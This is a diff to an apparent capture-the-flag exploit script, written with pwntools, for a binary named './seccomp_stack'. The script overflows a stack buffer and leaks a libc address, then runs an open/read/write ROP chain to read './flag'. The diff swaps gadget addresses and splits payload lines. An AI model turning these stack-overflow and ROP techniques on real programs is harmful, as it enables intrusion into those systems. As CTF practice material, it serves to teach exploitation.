@@ -33,16 +33,18 @@ p = process("./seccomp_stack")
 ## 1. Leak libc address 
 ## 2. Execute open/read/write gadget chain
 
-rdi_ret = 0x400993
-rw_section = 0x601000
+puts_plt = 0x401040
+rdi_ret = 0x401463
+rw_section = 0x404800
 
 bof = elf.sym["bof"]
 payload = "a" * 0x28 
 
 ## 1. Leak libc address 
 ## puts(pust.got)
-payload += p64(rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(bof)
+payload += p64(rdi_ret) + p64(elf.got["puts"]) + p64(puts_plt) + p64(bof)
 se(payload)
+
 
 libc_base = u64(rc(6) + "\x00\x00") - 0x80970
 read_addr = libc_base + 0x110020
@@ -55,14 +57,18 @@ pop_rax = libc_base + 0x1b500
 syscall = read_addr + 0xf
 
 
+
 payload = "a" * 0x28
 payload += p64(pop_rdi) + p64(0)
 payload += p64(pop_rsi) + p64(rw_section)
-payload += p64(pop_rdx) + p64(0x30) + p64(read_addr) + p64(bof)
+payload += p64(pop_rdx) + p64(0x30) 
+payload += p64(read_addr) 
+payload += p64(bof)
 sleep(0.1)
 se(payload)
 sleep(0.1)
 se("./flag")
+
 
 
 payload = "a" * 0x28
